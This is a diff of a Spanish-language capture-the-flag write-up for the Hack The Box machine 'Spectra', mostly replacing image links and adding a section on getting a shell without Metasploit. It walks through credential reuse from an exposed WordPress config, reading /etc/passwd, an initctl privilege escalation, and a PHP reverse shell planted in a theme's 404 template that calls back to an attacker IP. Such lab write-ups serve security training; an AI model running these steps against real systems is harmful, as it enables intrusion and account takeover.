@@ -1,6 +1,6 @@
 # SPECTRA HTB
 
-![logo](logo.png "Logo")
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/logo.PNG)
 
 ## ENUMERACION
 
@@ -22,7 +22,7 @@ filtramos los puertos con extracPorts
 extractPorts allPorts
 ```
 
-![ports](ports.png "Ports")
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/ports.PNG)
 
 Obtenemos los puertos en la clip board (22,80,3306,8081), ahora realizamos un descubrimiento de servicios en los puertos:
 
@@ -84,15 +84,15 @@ Nmap done: 1 IP address (1 host up) scanned in 50.90 seconds
 
 Veremos que tiene el puerto 8081
 
-![Puerto 8081](8081.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/8081.PNG)
 
 Nada relevante, vamos por el puerto 80:
 
-![Puerto 80](80.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/80.PNG)
 
 Vemos 2 enlaces, vamos al primero porque el segundo no lleva a nada:
 
-![Puerto 80_2](80_2.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/80_2.PNG)
 
 Vemos que es una pagina Wordpress, a la hora de ver una pagina en este CMS debemos tener en cuenta ciertas cosas: 
 
@@ -118,11 +118,11 @@ Dentro de este panel login si colocas un usuario  y una contraseña cualquiera y
 
 Ejemplo de usuario valido:
 
-![Usuario valido](login1.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/login1.PNG)
 
 Ejemplo de usuario invalido:
 
-![Usuario invalido](login2.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/login2.PNG)
 
 ** Ver el mensaje de error del panel **
 
@@ -147,11 +147,11 @@ wfuzz -c -hc 404 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt 
 
 ```
 
-![wfuzz](wfuzz.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/wfuzz.PNG)
 
 Se encuentran dos directorios, el main es la pagina wordpress. Vamos a ver que hay en testing:
 
-![testing](testing.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/testing.PNG)
 
 Vemos varios archivos, el mas interesante **wp-config.php.save** ya que es un archivo de configuración, mediante curl vamos a guardar este archivo en nuestro equipo:
 
@@ -161,7 +161,7 @@ curl 10.10.10.229/testing/wp-config.php.save > wp-config.php.save
 
 Al leer el archivo vemos una credenciales de base de datos:
 
-![wp-config](wp-config.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/wp-config.PNG)
 
 Vamos a intentar conectarnos por mysql ya que vimos que el puerto 3306 estaba abierto:
 
@@ -171,11 +171,11 @@ mysql -u devtest -h 10.10.10.229 -p
 
 Vemos que las credenciales no nos ayudan de mucho:
 
-![mysql](mysql.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/mysql.PNG)
 
 Ya que vimos que el usuario administrator es valido para wordpress, en el panel login vamos a comprobar si la contraseña del archivo es la de ese usuario:
 
-![login_in](login_in.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/login_in.PNG)
 
 Estamos dentro!
 
@@ -204,7 +204,7 @@ vamos a buscar un exploit para wordpress una vez que tenemos credenciales, lo qu
 search wordpress shell
 ```
 
-![msf1](msf1.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/msf1.PNG)
 
 El número 2 se ve interesante vamos a usarlo:
 
@@ -230,13 +230,13 @@ run
 
 ```
 
-![msf2](msf2.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/msf2.PNG)
 
 vemos que ingresamos como el usuario nginx
 
 vamos a ver a que directorios nos podemos dirigir una vez dentro:
 
-![directory_linux](directory_linux.jpg)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/directory_linux.PNG)
 
 Nos dirigimos a la ruta /opt y vemos un archivo llamado **autologin.conf.orig**
 
@@ -244,7 +244,7 @@ Nos dirigimos a la ruta /opt y vemos un archivo llamado **autologin.conf.orig**
 cat /opt/autologin.conf.orig
 ```
 
-![msf3](msf3.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/msf3.PNG)
 
 En el contenido de este archivo vemos algunas rutas de archivos, entre ellas uno que llama la atencion que es el **/etc/autologin**, vamos a ver que es ese fichero:
 
@@ -254,7 +254,7 @@ ls
 cat passwd
 ```
 
-![msf4](msf4.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/msf4.PNG)
 
 Vemos una contraseña **SummerHereWeCome!!**, recordemos que el puerto 22 (SSH) estaba abierto asi que veamos si podemos leer el archivo /etc/passwd para ver que usuarios hay aparte de nginx:
 
@@ -262,7 +262,7 @@ Vemos una contraseña **SummerHereWeCome!!**, recordemos que el puerto 22 (SSH) 
 cat /etc/passwd
 ```
 
-![msf5](msf5.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/msf5.PNG)
 
 Vemos el usuario katie y root, no fue la contraseña de root asi que probemos una conexion por ssh con el otro usuario:
 
@@ -275,7 +275,7 @@ Y estamos dentro via ssh con el usuario katie:
 ssh katie@10.10.10.229
 ```
 
-![sh_connection](sh_connection.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/sh_connection.PNG)
 
 Ya podemos ver la flag user.txt
 
@@ -287,7 +287,7 @@ Es hora de esaclar privilegios, vamos a ver la lista de los comandos que puede r
 sudo -l
 ```
 
-![sudo](sudo.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/sudo.PNG)
 
 vemos que podemos ejecutar /sbin/initctl.
 
@@ -314,7 +314,7 @@ cd /etc/init
 ls -la
 ```
 
-![init](init.png)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/init.PNG)
 
 Vemos muchos archivos, primero vamos a ver en que grupos esta el usuario katie para saber cuales de estos archivos podemos editar:
 
@@ -322,7 +322,7 @@ Vemos muchos archivos, primero vamos a ver en que grupos esta el usuario katie p
 id
 ```
 
-![[Pasted image 20210514160512.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/Pasted%20image%2020210514160512.png)
 
 Katie pertenece a los grupos katie y developers, vamos afiltrar los archivos en los que el grupo son developers:
 
@@ -330,7 +330,7 @@ Katie pertenece a los grupos katie y developers, vamos afiltrar los archivos en 
 ls -la | grep developers
 ```
 
-![[Pasted image 20210514160711.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/Pasted%20image%2020210514160711.png)
 
 Cualquiera de estos archivos tiene permisos de escritura para los usuarios del grupo developers (el grupo al que petenece katie). Veamos el contenido del primero:
 
@@ -338,7 +338,7 @@ Cualquiera de estos archivos tiene permisos de escritura para los usuarios del g
 cat test.conf
 ```
 
-![[Pasted image 20210514160851.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/Pasted%20image%2020210514160851.png)
 
 Dentro de las palabras clave **script** y **end script** se escriben comandos que se ejecuta cuando se levanta el archivo mediante el uso de initctl, entonces antes de editar este archivo vamos a para este servicio para que tomen efecto los cambios:
 
@@ -348,7 +348,7 @@ sudo /sbin/initctl stop test
 
 Lo hacemos con sudo porque nos lo mostro el comando **sudo -l**
 
-![[Pasted image 20210514161303.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/Pasted%20image%2020210514161303.png)
 
 Ese mensaje sale porque ya esta abajo, en todo caso saldria que el servicio se esta deteniendo si es que estuviera levantado. 
 
@@ -376,6 +376,89 @@ Y abrimos nuestra shell:
 /bin/bash -p
 ```
 
-![[Pasted image 20210514162734.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/Pasted%20image%2020210514162734.png)
 
 Ya podemos ver la flag root.txt
+
+
+## SIN METASPLOIT EL ACCESO AL SISTEMA
+
+Es posible ganar acceso al sistema sin la ayuda de metasploit, aprovechandonos de la plantilla 404 de wordpress.
+
+Dentro del dashboard de Wordpress nos vamos a appearance > themes editor:
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/1.PNG)
+
+Y buscamos la plantilla 404 en files themes y podemos colocar el codigo en php que queremos que se nos interprete cuando busq	uemos una ruta que nos exista y nos salga esa plantilla:
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/2.PNG)
+
+En caso de algun mensaje de error puedes probar con la misma plantilla 404 pero de otro tema:
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/3.PNG)
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/4.PNG)
+
+En este caso voy a usar otro porque nos salio el mensaje de error, usare el twenty nineteen y ahi no sale un mensaje de error:
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/5.PNG)
+
+Entonces si vamos a la siguiente ruta nos mostrara nuestro comando que colocamos:
+
+```
+spectra.htb/main/wp-content/themes/<nuestro tema editado>/404.php
+```
+
+En nuestro caso el tema es twenty nineteen:
+
+```
+spectra.htb/main/wp-content/themes/twentynineteen/404.php
+```
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/6.PNG)
+
+vemos que esta ejecutando comandos a nivel de sistema, entonces podemos intentar spawnearnos una shell:
+
+colocamos lo siguiente en la plantilla que es una plantilla de monkey pentester:
+
+![monkey pentester](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+a la plantilla solo se cambia los siguiente:
+
+```
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.16.41';  // NUESTRA IP
+$port = 443;       // PUERTO A LA ESCUCHA
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+
+y nos colocamos a la escucha con netcat:
+
+```
+nc -lvnp 443
+```
+
+y obtenemos una conexion reversa:
+
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/7.PNG)
+
+podemos hacer un tratamiento de la tty:
+
+```
+script /dev/null -c bash
+[ctrl + Z]
+stty raw -echo; fg
+reset
+xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 53 columns 187
+```
+
+
